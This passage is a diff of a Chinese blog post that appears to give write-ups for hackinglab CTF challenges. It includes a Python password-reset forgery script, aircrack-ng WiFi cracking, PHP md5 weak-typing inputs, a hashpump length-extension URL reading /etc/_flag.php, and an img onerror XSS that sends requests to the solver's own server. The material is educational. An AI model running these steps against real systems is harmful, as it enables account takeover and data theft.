+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>所以我们照常在每个页面都抓包试一试，在这个页面可以看到<code>重置密码链接</code>提交的值中有两个参数，<br>一个是<code>sukey</code>，一个是<code>username</code></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>将<code>username</code>改为<code>admin</code>，发现什么都没有显示:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>现在只能看另一个参数<code>sukey</code>了，长度看起来像<code>md5</code>，<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5解密</a>试试：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>解出来是一个<code>时间戳</code>，转为北京时间是<code>2018/7/19 14:5:54</code></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>就是我刚刚提交的时间，所以思路大概就是将上传的时间转为<code>Unix时间戳</code>，然后<code>md5</code>加密，<br>将<code>sukey</code>和<code>username</code>分别等于<code>md5加密后的时间戳</code>和<code>admin</code>提交，<br>并且响应包得到的时间是比实际时间少的，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>这里给出两种做法</p>
@@ -474,71 +475,71 @@
 <p>第一种：</p>
 <p>先提交<code>username</code>为<code>admin</code>，然后记录下<code>响应头</code>的<code>date</code></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>然后去<a href="http://tool.chinaz.com/Tools/unixtime.aspx" target="_blank" rel="noopener">在线网站</a>转为时间戳,<br>记住小时需要跟北京时间一样，其他都一样</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>将<code>sukey</code>等于<code>时间戳md5加密后的值</code>访问即可，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>得到key</p>
 <p>第二种是用python，但是<code>time()</code>函数得到的当前时间戳与上传时的对不上，<br>所以只能与手动的方法一样，从响应头里获取时间。<br>附上脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests,hashlib,time,re</span><br><span class="line"></span><br><span class="line">def month(month):</span><br><span class="line">	months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;]</span><br><span class="line">	for a in range(0,len(months)):</span><br><span class="line">		if months[a] == month:</span><br><span class="line">			return a+1</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;</span><br><span class="line">post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;</span><br><span class="line">a = r.post(url,data = post)</span><br><span class="line">list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])</span><br><span class="line">ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])</span><br><span class="line">sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;</span><br><span class="line">print(r.get(url2).text)</span><br></pre></td></tr></table></figure></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h4><p>这题给的是一个<code>wifi的握手包</code>，kali中有专门的工具来破解握手包<code>aircrack</code>，<br>但是需要字典，给了<code>年级和年份</code>，估计密码就是生日了，<br>先从网上下载一个生日字典，也可以自己生成<br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi-crack.cap -w pass.txt</span><br></pre></td></tr></table></figure></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>得到生日密码之后按照题目要求加密提交即可</p>
 <h4 id="万恶的Cisco"><a href="#万恶的Cisco" class="headerlink" title="万恶的Cisco"></a>万恶的Cisco</h4><p>直接<code>GoogleCisco破解</code>,<a href="http://www.toolsxx.com/code/cisco.php" target="_blank" rel="noopener">Cisco思科密码在线解密</a></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="万恶的加密"><a href="#万恶的加密" class="headerlink" title="万恶的加密"></a>万恶的加密</h4><p>huawei交换机的加密方式，有人写过<a href="https://github.com/grutz/h3c-pt-tools" target="_blank" rel="noopener">python工具</a><br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot;</span><br></pre></td></tr></table></figure></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="喜欢泡网吧的小明"><a href="#喜欢泡网吧的小明" class="headerlink" title="喜欢泡网吧的小明"></a>喜欢泡网吧的小明</h4><p>给的是一个<code>dump</code>文件，里头的内容有些看不懂，看了网上的wp才知道做的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。</span><br></pre></td></tr></table></figure></p>
 <p>直接将文件上传的话会显示<code>卡片异常</code>，并且题目提示了有一个字节产生了错误。</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>网上给的wp是将开头的<code>AA</code>变为<code>8A</code>, 原因是头部信息错误所以读取失败，具体为什么改为<code>8A</code>也不清楚，<br>但是改为<code>8A</code>后，提示:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>可以正常刷卡了，但是余额为100，往下看文件内容，有<code>1027</code>，转为10进制是<code>4135</code>，没有啥关系，<br>但是这些卡的加密方式是有可能倒叙的，所以再试试<code>2710</code>，可以发现刚好是<code>10000</code>，对应的是100.00，所以我们现在只需要将<code>20000</code>转为16进制，然后倒序即可,将两个<code>1027</code>的值改为<code>204E</code>，保存再上传即可</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="异常数据"><a href="#异常数据" class="headerlink" title="异常数据"></a>异常数据</h4><p>题目给出一段加密后的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AGV5IULSB3ZLVSE=</span><br></pre></td></tr></table></figure></p>
 <p>数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，<br>base64是3位为一组，加密成4个字节，所以分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AGV5</span><br><span class="line">IULS</span><br><span class="line">B3ZL</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure></p>
 <p>首先看看第一次解密:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>出了乱码，所以将A改为小写</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>可以发现思路就是这样，<code>hey</code>已经出来了，所以可以进行下一组，重复这个步骤即可</p>
@@ -549,18 +550,18 @@
 <p>大概意思就是<code>$rootadmin</code>的md5要跟上传上去的值的md5一样，而且本身的值也不能一样<br>先看看<code>!1793422703!</code>的md5是多少,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e332932043729729062996282883873</span><br></pre></td></tr></table></figure></p>
 <p>0e后面全是数字，php弱类型，POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=240610708或者QNKCDZO</span><br></pre></td></tr></table></figure></p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>拿到key</p>
 <h4 id="小明爱上了一个搞硬件的小姑凉"><a href="#小明爱上了一个搞硬件的小姑凉" class="headerlink" title="小明爱上了一个搞硬件的小姑凉"></a>小明爱上了一个搞硬件的小姑凉</h4><p>题目给的是一个<code>logicdata</code>文件，提示是一个逻辑分析仪抓包数据，<br>winhex打开之后，在文件的最后有一串英文，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>搜一搜<code>saleae</code>,发现需要下载这个公司的软件才能解密<br><a href="https://www.saleae.com/zh/downloads/" target="_blank" rel="noopener">下载链接</a><br>下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，<code>COMMA</code>是逗号的意思</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/73840994.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/73840994.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/73840994.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h4><p>右键查看源代码可以看到部分代码</p>
@@ -570,20 +571,20 @@
 <p>这里我们知道的是<code>signature</code>、<code>data</code>、<code>keylength</code>,需要读取的文件这里写成<code>_flag.php</code><br>所以工具使用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php</span><br></pre></td></tr></table></figure>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/41625045.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/41625045.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/41625045.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>提交时需要把<code>\x</code>换成<code>%</code>，因为是URL编码的<br>最终的payload是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c</span><br></pre></td></tr></table></figure></p>
 <h4 id="美丽的邂逅与密码器的开门密码"><a href="#美丽的邂逅与密码器的开门密码" class="headerlink" title="美丽的邂逅与密码器的开门密码"></a>美丽的邂逅与密码器的开门密码</h4><p>这题题目给的一个exe文件，名字还是<code>reverse</code>,逆向题，IDA打开之后找到主函数</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/25904383.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/25904383.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/25904383.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>可以看到当<code>v19</code>等于<code>1</code>的时候才会输出一段字符，找到<code>401005</code>函数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401005(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_401020(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>又跳到了<code>401020</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL __cdecl sub_401020(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2; // [sp+Ch] [bp-44h]@1</span><br><span class="line">  int v3; // [sp+4Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;v2, 0xCCu, 0x44u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v3 = strlen(a1);</span><br><span class="line">  return v3 &gt; 50;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看出来当<code>v20</code>的长度大于<code>50</code>就能返回<code>true</code>，也就是<code>1</code><br>运行程序，输入任意字符，长度大于50:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/66247550.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/66247550.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/66247550.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>得到key</p>
@@ -596,36 +597,36 @@
 </ul>
 <p>这题就有了大概的思路，需要登录进<code>admin</code>账户，但是不知道密码，<br>爆破试了之后发现不少弱口令，所以需要<code>重置密码</code>，<code>重置密码</code>时需要<code>手机号</code>，<br>但是当将<code>username</code>等于<code>admin</code>之后，发现:</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/35560040.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/35560040.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/35560040.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>所以需要将<code>admin</code>用户的手机号绑定为已知的手机号，刚好在绑定手机页面<code>username</code>可以更改，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/18276112.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/18276112.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/18276112.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>回到<code>忘记密码</code>页面，Username填写<code>admin</code>，正常发送即可重置密码</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/74060841.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/74060841.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/74060841.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>再用重置的密码登陆即可得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/4310267.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/4310267.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/4310267.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="没有注入到底能不能绕过登录"><a href="#没有注入到底能不能绕过登录" class="headerlink" title="没有注入到底能不能绕过登录"></a>没有注入到底能不能绕过登录</h4><p>首先题目提示了不是SQL注入，并且题目里没有什么有用的提示，<br>所以只能先扫一下后台，发现<code>robots.txt</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /myadminroot/</span><br></pre></td></tr></table></figure>
 <p>访问一下<code>myadminroot</code>，但是提示<code>Please login first!</code><br>所以现在找办法登陆，但是我用burpsuite抓包时发现，<br>在登陆页面<code>go</code>一次之后，在其他页面访问<code>myadminroot</code>就能得到<code>key</code><br>所以发现了在弹出<code>error</code>时，不点击确认就不会将已经登陆的状态取消，<br>估计就是<code>session</code>的原因，直接得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/32440387.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/32440387.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/32440387.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <h4 id="美图闪亮亮交友平台"><a href="#美图闪亮亮交友平台" class="headerlink" title="美图闪亮亮交友平台"></a>美图闪亮亮交友平台</h4><p>题目直接给了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tips: 邮箱没有xss漏洞</span><br><span class="line">Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823)</span><br></pre></td></tr></table></figure></p>
 <p>邮箱没有XSS，但是在题目中的<code>input</code>框中还是存在XSS，管理员也没有cookie，<br>所以没办法使用<code>管理员的cookie</code>登陆进后台，<br>在网上找了也没有writeup，最终看到了<a href="http://www.dianyue.me/archives/743/jgm7qbcmkh94wam6/" target="_blank" rel="noopener">出题人给的提示</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目采用curl模拟方式来模拟管理员审核的过程。</span><br></pre></td></tr></table></figure></p>
 <p>估计是<code>SSRF</code><br>先说下解题思路，在<code>姓名</code>和<code>照片描述</code>处都没有做要求，但是在<code>图片URL</code>处对内容做了要求，<br>必须是网址，但是抓包发送的话可以<code>绕过js</code>，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/85558377.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/85558377.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/85558377.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>并且在<code>&lt;img&gt;</code>处没有过滤，可以正常弹窗，代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hackinglab.cn/meitu.jpg11&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
@@ -642,22 +643,22 @@
 <p>图片URL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的服务器IP:8888</span><br></pre></td></tr></table></figure></p>
 <p>再发送即可，</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/57813388.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/57813388.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/57813388.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>此时在自己的服务器上可以看到一个请求</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/97865878.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/97865878.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/97865878.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>访问这个URL即可得到key</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/31563770.jpg" alt="" title="" class="">
+                <a rel=hackinglab网络安全实验室writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/31563770.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/31563770.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
